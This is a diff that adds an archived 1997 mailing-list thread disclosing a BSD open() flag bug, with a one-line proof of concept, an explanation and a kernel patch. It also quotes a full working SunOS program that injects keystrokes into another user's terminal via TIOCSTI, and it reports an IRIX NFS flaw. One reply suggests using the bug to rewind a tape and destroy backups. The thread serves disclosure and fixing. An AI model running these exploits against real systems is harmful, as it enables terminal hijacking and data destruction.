@@ -1,0 +1,332 @@
+
+[ This affects {Free,Net,Open}BSD. Joerg Wunsch fixed it yesterday in
+  freebsd-current. - a1 ]
+
+This was sent to me recently...  It seems to be a pretty serious hole
+in open() and permissions...
+
+Note, in the following, open() succeeds, and ioctls are probably
+executed...
+
+/*
+ * This will give you a file descriptor on a device you should not have
+ * access to.  This seems really, really screwed up, since holding a fd
+ * lets you do a lot of ioctls that you should not be able to do...
+ */
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <err.h>
+
+int
+main(int argc, char **argv)
+{
+  int fd;
+
+  fd = open("/dev/rsd0a", -1, 0);
+
+  if (fd < 0)
+    err(1, "open");
+}
+
+
+----------------------------------------------------------------------------
+
+In muc.lists.freebsd.security, you wrote:
+>  fd = open("/dev/rsd0a", -1, 0);
+
+Yep. This definitely works on {Free,Net,Open}BSD.
+
+This is a variant of a bug Theo de Raadt found in SunOS back in the 1980s.
+The basic issue is that the code that guards access to the device-specific
+open() routine checks explicitly for FREAD, FWRITE, and O_TRUNC, and
+passes the call through if none of these are set. Theo's bug involved
+using "3" for the open() flag.
+
+The problem here is that before calls to open() are even passed to the
+vnode open() routine (after the vnode is looked up by the generic
+vfs_syscalls open() syscall handler), the flags field is incremented by
+one:
+
+vfs_syscalls.c:open()
+
+        ...
+
+        flags = FFLAGS(uap->flags);
+
+        ...
+
+where FFLAGS() is:
+
+./sys/fcntl.h:#define  FFLAGS(oflags)  ((oflags) + 1)
+
+As you can see, passing a "-1" to open() will result in "flags" becoming
+"0" - open() ordinarily never passes "0" to the vnode code, since "0"
+becomes "1" after being converted to fflags format.
+
+A fun game you can play with practically no programming ability is to
+exploit the fact that some devices will initialize themselves immediately
+upon being opened - particularly amusing is the SCSI tape driver,
+sys/scsi/st.c, which will rewind itself when opened. Simply run the
+previously posted example code on /dev/rst0 and destroy tonight's backup.
+
+If you want to hack this fixed in FreeBSD, you can apply the enclosed diff
+to your kernel; this is a total hack, and someone else will provide a
+"correct" fix soon enough.
+
+Incidentally, this is yet another piece of evidence supporting the
+presence of another systemic secure-coding problem - sanity checking
+integer arguments and guarding against overflow. This is far from the only
+place that I've seen problems with unexpected interactions owing to
+surprise negative arguments. Anyone want to take a guess as to what
+strncpy() does when it gets a negative "count" argument? Think that can't
+happen? Think pointer arithmetic.
+
+--
+-----------------------------------------------------------------------------
+Thomas H. Ptacek                                        Secure Networks, Inc.
+-----------------------------------------------------------------------------
+                                                     "mmm... sacrilicious..."
+
+--- vfs_syscalls.c-orig Thu Oct 23 01:21:58 1997
++++ vfs_syscalls.c      Thu Oct 23 01:21:19 1997
+@@ -690,6 +690,9 @@
+                return (error);
+        fp = nfp;
+        flags = FFLAGS(uap->flags);
++       if(!flags)
++               flags++;
++
+        cmode = ((uap->mode &~ fdp->fd_cmask) & ALLPERMS) &~ S_ISTXT;
+        NDINIT(&nd, LOOKUP, FOLLOW, UIO_USERSPACE, uap->path, p);
+        p->p_dupfd = -indx - 1;                 /* XXX check for fdopen */
+
+
+------------------------------------------------------------------------
+
+
+> This is a variant of a bug Theo de Raadt found in SunOS back in the 1980s.
+> The basic issue is that the code that guards access to the device-specific
+> open() routine checks explicitly for FREAD, FWRITE, and O_TRUNC, and
+> passes the call through if none of these are set. Theo's bug involved
+> using "3" for the open() flag.
+
+The bug worked in SunOS 4.0 and 4.1, and if I remember correctly it
+was fixed in 4.1.3.  What you basically did was this:
+
+- lose your tty association
+- open the console device you want to attack (ie. say, root is
+  logged into the console)
+- fd = open("/dev/console", 3); close(fd);
+- now you have just gained tty association.
+- fd = open("/dev/tty", O_RDWR).  This is the same as having opened
+  /dev/console, but this time I have permission to read & write.
+- ioctl(fd, TIOCSTI, &c) ...
+
+Of course, TIOCSTI simulates console input.
+
+That this basic bug is still around is pretty dissapointing.  I
+reported the bug to Sun, but I guess they never told anyone else about
+it, and hence it did not get fixed in the standard BSD code.
+
+I'm a little dissapointed in myself for not having looked to see if
+this bug still existed.  Of course, the routed problems still exist
+too, and that bug is about as old. I fixed it in OpenBSD yesterday.
+
+Any vn_open() with FREAD|FWRITE == 0 fails with EINVAL.
+
+here's the program I wrote a VERY VERY long time ago.  (Neato, it has
+some little buffer overflows in it ;-)
+
+----------------------------------------
+
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <sys/signal.h>
+#include <sys/file.h>
+#include <stdio.h>
+
+#define ECHAR ((unsigned char)0x1d)
+
+unsigned char tty[80];
+int fd, p[2];;
+int v = 1, sc = 1;
+
+/* ----------------------------------------------------------------------
+ * MAIN:
+ * ------------------------------------------------------------------- */
+main(argc, argv)
+int argc;
+char **argv;
+{
+    int i, j, x;
+    unsigned char c;
+
+    if( argc<2 ) {
+        fprintf(stderr, "Usage: %s [-v] tty\n", argv[0]);
+        exit(0);
+    }
+
+    if( !strcmp(argv[1], "-v") ) {
+        sprintf(tty, "/dev/%s", argv[2]);
+        v = 1;
+    } else sprintf(tty, "/dev/%s", argv[1]);
+
+    printf("The escape character is ^]\n");
+    status(0);
+
+    pipe(p);
+    if( fork() == 0) {
+        close(p[1]);
+
+        x = getpgrp(0);
+        signal(SIGTTIN, SIG_IGN);
+        signal(SIGTTOU, SIG_IGN);
+
+        ioctl(open("/dev/tty",0), TIOCNOTTY, 0);
+        if( open(tty, 3) <0)
+            open(tty, O_WRONLY);
+        fd = open("/dev/tty", 2);
+        setpgrp(0,x);
+
+        while(1) {
+            x = read(p[0], &c, 1);
+            if(x==1) ioctl(fd, TIOCSTI, &c);
+            if(x==0) exit();
+        }
+
+    } else {
+        close(p[0]);                                            /* me */
+        echo(0);
+
+        while( read(0, &c, 1) == 1) {
+            c &= 0x7f;          /* kill parity bit */
+            if(c==ECHAR) {
+                if( read(0, &c, 1) == 1) switch( c&0x7f ) {
+                    case 'q':
+                    case 'Q':   die();
+                                break;
+                    case 'c':
+                    case 'C':   sc = !sc;
+                                status(1);
+                                break;
+                    case 'v':
+                    case 'V':   v = !v;
+                                status(1);
+                                break;
+                    case 's':
+                    case 'S':   status(1);
+                                break;
+                    case '?':
+                    case 'h':
+                    case 'H':   status(1);
+                                printf("\n\r? - this screen\n\r");
+                                printf("q - quit\n\r");
+                                printf("v - verbose\n\r");
+                                printf("c - control characters\n\r");
+                                printf("s - status\n\r");
+                                break;
+                    default:    send(ECHAR);
+                                send(c);
+                                break;
+                    }
+                else die();
+            } else send(c);
+        }
+        die();
+    }
+}
+
+/* ----------------------------------------------------------------------
+ * SEND:
+ * ------------------------------------------------------------------- */
+send(c)
+unsigned char c;
+{
+    unsigned char c2;
+
+    c &= 0x7f;
+    write(p[1], &c, 1);
+    if(v) {
+        if( c==' ' || c=='\t' ) {               /* tab and space */
+            write(1, &c, 1);
+        } else if( c=='\r' || c=='\n' ) {       /* return */
+            write(1, "\r\n", 2);
+        } else if( c<' ' ) {                    /* control characters */
+            if(sc) {
+                write(1, "^", 1);
+                c2 = c & 0x7f | 0x40;
+                write(1, &c2, 1);
+            }
+        } else {                                /* normal characters */
+            write(1, &c, 1);
+        }
+    }
+}
+
+/* ----------------------------------------------------------------------
+ * ECHO:
+ * ------------------------------------------------------------------- */
+echo(n)
+int n;
+{
+    struct sgttyb ttyb;
+
+    ioctl(0, TIOCGETP, &ttyb);
+    if(n) ttyb.sg_flags = (ttyb.sg_flags | ECHO) & ~RAW;
+    else ttyb.sg_flags = (ttyb.sg_flags & ~ECHO) | RAW;
+    ioctl(1, TIOCSETP, &ttyb);
+}
+
+/* ----------------------------------------------------------------------
+ * DIE:
+ * ------------------------------------------------------------------- */
+die()
+{
+    echo(1);
+    exit(0);
+}
+
+status(x)
+int x;
+{
+    if(x) printf("\n\r");
+    printf("verbose:%d control:%d\n\r", v, sc);
+}
+
+
+
+----------------------------------------------------------------------------------
+
+
+As long as we're on the topic of broken open() calls, here's one
+I discovered last february in IRIX 6.2.
+
+Basically, if you have SGI NFS clients mounting filesystems from
+SGI NFS servers with "root-as-nobody" access (access= entry, but
+no root= entry), you can open() any regular file from the NFS
+client.   You can't read it, but you can open it.   Once you've
+opened it, this tends to corrupt the kernel file tables.   Often
+this results in the following possibilities:
+
+        - Root on the client can now read the file.
+        - No one else can access the file.
+
+This continues until the machine is rebooted, thus it's most likely
+only a problem in the SGI NFS client side of the software.
+
+SGI did finally create Bug #465954, but I've been told that it's
+unlikely that it'll be fixed anytime soon.
+
+SGI's only response has been the following:
+
+"The only workaround at this time for Bug #465954 is to specify
+the root= option in /etc/exports. One of our lead engineer has
+stated in the bug report that this does not cause a security problem,
+so it should be safe for you to implement."
+
+The only useful workaround I've been able to determine is to make
+sure that any non-"root-as-nobody"-readable files are located in
+directories that are also not accessible by "root-as-nobody" so
+that this condition never pops up.
+
